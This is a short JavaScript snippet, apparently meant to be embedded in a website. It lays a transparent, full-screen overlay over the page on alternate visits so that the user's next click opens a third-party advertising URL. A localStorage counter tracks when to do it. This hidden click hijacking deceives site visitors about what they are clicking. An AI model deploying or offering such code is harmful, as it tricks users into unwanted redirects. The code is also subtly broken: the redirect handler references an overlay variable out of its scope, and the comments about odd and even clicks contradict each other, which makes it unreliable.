document.addEventListener('DOMContentLoaded', () => {
  // Read click count from localStorage
  let clickCount = parseInt(localStorage.getItem('adClickCount') || '0');

  // Function to handle redirect and overlay
  function handleRedirectClick() {
    // Remove overlay immediately so it doesn't block the new page
    overlay.remove();
    // Increment click count and store
    clickCount++;
    localStorage.setItem('adClickCount', clickCount.toString());
    // Redirect to your ad
    window.location.href = 'https://flirtatiousmoviesbrightly.com/m5u0fm024?key=915f5541df37252209d1ab523c2cc8e5';
  }

  if (clickCount % 2 === 0) {
    // If it's an odd-numbered user click (0, 2, 4...) which is 1st, 3rd, etc.
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = 0;
    overlay.style.left = 0;
    overlay.style.width = '100vw';
    overlay.style.height = '100vh';
    overlay.style.zIndex = 9999;
    overlay.style.cursor = 'pointer';
    overlay.style.background = 'transparent';

    document.body.appendChild(overlay);
    overlay.addEventListener('click', handleRedirectClick);
  } else {
    // Even-numbered clicks (2nd, 4th...) — allow normal interaction
    const removeOnce = () => {
      clickCount++;
      localStorage.setItem('adClickCount', clickCount.toString());
    };
    document.addEventListener('click', removeOnce, { once: true });
  }
});
